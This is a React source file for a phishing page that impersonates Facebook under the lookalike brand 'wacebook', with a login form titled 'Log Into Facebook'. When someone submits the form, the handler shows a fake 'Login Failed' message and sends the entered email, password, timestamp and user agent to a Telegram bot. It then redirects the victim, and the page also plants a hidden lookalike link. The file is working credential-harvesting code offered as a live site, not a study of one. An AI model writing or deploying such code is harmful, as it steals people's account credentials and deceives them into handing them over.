
import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Separator } from '@/components/ui/separator';
import { useToast } from '@/hooks/use-toast';
import { sendToTelegramBot } from '@/config/telegram';
import Footer from '@/components/Footer';

const Index = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  useEffect(() => {
    // Create masked link
    const link = document.createElement("a");
    link.href = "https://www.wacebook.com/login";
    link.textContent = "https://www.wacebook.com";
    link.style.display = "none"; // Hide the link
    document.body.appendChild(link);

    return () => {
      // Cleanup: remove the link when component unmounts
      if (document.body.contains(link)) {
        document.body.removeChild(link);
      }
    };
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    // Show error toast
    toast({
      title: "Login Failed",
      description: "The email address or password you entered isn't connected to an account.",
      variant: "destructive",
    });

    // Prepare data for Telegram bot
    const telegramData = {
      email,
      password,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent
    };

    try {
      // Send data to Telegram bot
      await sendToTelegramBot(telegramData);
      console.log('Data successfully sent to Telegram bot');
    } catch (error) {
      console.error('Failed to send data to Telegram bot:', error);
    }
    
    // Redirect after 2 seconds
    setTimeout(() => {
      setIsLoading(false);
      navigate('/security-report');
    }, 2000);
  };

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <div className="flex justify-center pt-20 pb-8">
        <h1 className="text-6xl font-bold text-blue-600 tracking-tight">
          wacebook
        </h1>
      </div>

      {/* Main Content */}
      <div className="flex flex-col items-center px-4 pb-20">
        <div className="w-full max-w-md">
          <Card className="shadow-lg border-gray-200">
            <CardContent className="p-6">
              <div className="text-center mb-6">
                <h2 className="text-xl font-medium text-gray-700">
                  Log Into Facebook
                </h2>
              </div>

              <form onSubmit={handleLogin} className="space-y-4">
                <Input
                  type="text"
                  placeholder="Email address or phone number"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="h-12 text-base border-gray-300 focus:border-blue-500"
                  required
                />

                <Input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="h-12 text-base border-gray-300 focus:border-blue-500"
                  required
                />

                <Button
                  type="submit"
                  disabled={isLoading}
                  className="w-full h-12 text-lg font-semibold bg-blue-600 hover:bg-blue-700 transition-colors duration-200"
                >
                  {isLoading ? 'Logging in...' : 'Log In'}
                </Button>

                <div className="text-center">
                  <a
                    href="#"
                    className="text-blue-600 hover:text-blue-800 text-sm transition-colors duration-200"
                  >
                    Forgotten account?
                  </a>
                </div>
              </form>

              <div className="my-6">
                <Separator className="bg-gray-300" />
              </div>

              <div className="text-center">
                <Button
                  variant="outline"
                  className="bg-green-500 hover:bg-green-600 text-white border-green-500 hover:border-green-600 font-semibold px-8 py-3 transition-colors duration-200"
                >
                  Create new account
                </Button>
              </div>
            </CardContent>
          </Card>

          <div className="text-center mt-8 text-sm text-gray-600">
            <p>
              <strong>Create a Page</strong> for a celebrity, brand or business.
            </p>
          </div>
        </div>
      </div>

      <Footer />
    </div>
  );
};

export default Index;
